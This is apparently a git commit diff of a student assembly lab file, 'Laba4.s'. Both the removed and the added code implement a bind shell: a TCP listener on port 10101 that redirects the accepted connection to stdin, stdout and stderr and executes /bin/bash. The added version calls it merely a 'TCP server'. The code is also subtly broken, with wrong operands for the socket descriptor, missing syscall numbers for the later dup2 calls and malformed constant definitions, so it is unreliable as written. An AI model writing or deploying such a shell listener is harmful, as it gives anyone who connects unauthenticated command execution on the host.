3a1903d91fe3ab52bf181ea3b0f7f40ccda05c1f
Хімін Роман <125272724+karasu000@users.noreply.github.com>
2024-05-03 17:30:07 +0300

    Update Laba4.s

--- Laba4.s
+++ Laba4.s
@@ -1,66 +1,80 @@
-; Оголошення секцій
-.bss
-sin: .space 16 ; Структура sockaddr_in
+/* TCP server in assembly */
+.global _start
 
 .data
-sock: .long 0 ; Дескриптор сокета
-fd: .long 0 ; Дескриптор з'єднання
+    sin_family:     .word AF_INET
+    sin_port:       .word 0x7527   /* Port number 10101 in network byte order */
+    sin_addr:       .long INADDR_ANY
+    sin_zero:       .skip 8         /* Padding to match sockaddr_in structure */
+
+    sock:           .long 0         /* Socket file descriptor */
+    fd:             .long 0         /* Accepted connection file descriptor */
+
+    bash:           .asciz "/bin/bash"
 
 .text
-.global main
+_start:
+    /* Create socket */
+    movq $SYS_SOCKET, %rax
+    movq $AF_INET, %rdi
+    movq $SOCK_STREAM, %rsi
+    movq $IPPROTO_TCP, %rdx
+    syscall
+    movq %rax, sock
 
-main:
-    ; Створення TCP-сокета
-    mov $AF_INET, %eax
-    mov $SOCK_STREAM, %ebx
-    mov $IPPROTO_TCP, %ecx
-    syscall ; socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
-    mov %eax, sock ; Збереження дескриптора сокета
-
-    ; Заповнення структури sockaddr_in
-    movw $AF_INET, sin.sin_family
-
-    ; movw $10101, %ax ; PORT = 10101
-    lea $10101, %rax ; завантажити адресу 10101 у %rax
-    xchgb %ah, %al ; htons(), AH ⇔ AL
-    movw %ax, sin.sin_port
-
-    ; Прив'язка сокета до адреси
-    mov $SYS_BIND, %rax
-    movq sock, %rdi
-    movq sin, %rsi ; Адреса структури sin
-    movq $0x10, %rdx ; sizeof(sockaddr_in) = 16
-    syscall ; bind(SOCKFD, &sin, sizeof(sin))
-
-    ; Слухання з'єднань
-    mov $SYS_LISTEN, %rax
-    movq sock, %rdi
-    mov $1, %rdx ; backlog = 1
-    syscall ; listen(sock, 1)
-
-    ; Прийняття з'єднання
-    mov $SYS_ACCEPT, %rax
-    movq sock, %rdi
-    mov $0, %rsi ; NULL
-    mov $0, %rdx ; NULL
-    syscall ; accept(sock, NULL, NULL)
-    mov %eax, fd ; Збереження дескриптора з'єднання
-
-    ; Перевизначення стандартних дескрипторів
-    dup2(fd, 0) ; stdin
-    dup2(fd, 1) ; stdout
-    dup2(fd, 2) ; stderr
-
-    ; Запуск /bin/bash
-    mov $SYS_EXECVE, %rax
-    mov $bash, %rdi ; /bin/bash
-    mov $0, %rsi ; NULL
-    mov $0, %rdx ; NULL
+    /* Prepare sockaddr_in structure */
+    movq $SYS_BIND, %rax
+    movq $sock, %rdi
+    leaq sin_family, %rsi
+    movq $sizeof_sockaddr_in, %rdx
     syscall
 
-    ; Вихід з програми
-    mov $SYS_EXIT, %rax
-    mov $0, %rdi
+    /* Listen for connections */
+    movq $SYS_LISTEN, %rax
+    movq $sock, %rdi
+    movq $1, %rsi  /* backlog */
     syscall
 
+accept_loop:
+    /* Accept connection */
+    movq $SYS_ACCEPT, %rax
+    movq $sock, %rdi
+    movq $0, %rsi
+    movq $0, %rdx
+    syscall
+    movq %rax, fd
 
+    /* Duplicate file descriptors */
+    movq $SYS_DUP2, %rax
+    movq $fd, %rdi
+    movq $0, %rsi
+    syscall
+    movq $fd, %rdi
+    movq $1, %rsi
+    syscall
+    movq $fd, %rdi
+    movq $2, %rsi
+    syscall
+
+    /* Execute /bin/bash */
+    movq $SYS_EXECVE, %rax
+    movq $bash, %rdi
+    movq $0, %rsi
+    movq $0, %rdx
+    syscall
+
+    /* Endless loop to accept multiple connections */
+    jmp accept_loop
+
+/* Constants */
+SYS_SOCKET:         .equ 41
+SYS_BIND:           .equ 49
+SYS_LISTEN:         .equ 50
+SYS_ACCEPT:         .equ 43
+SYS_DUP2:           .equ 33
+SYS_EXECVE:         .equ 59
+
+AF_INET:            .equ 2
+SOCK_STREAM:        .equ 1
+IPPROTO_TCP:        .equ 6
+INADDR_ANY:         .equ 0
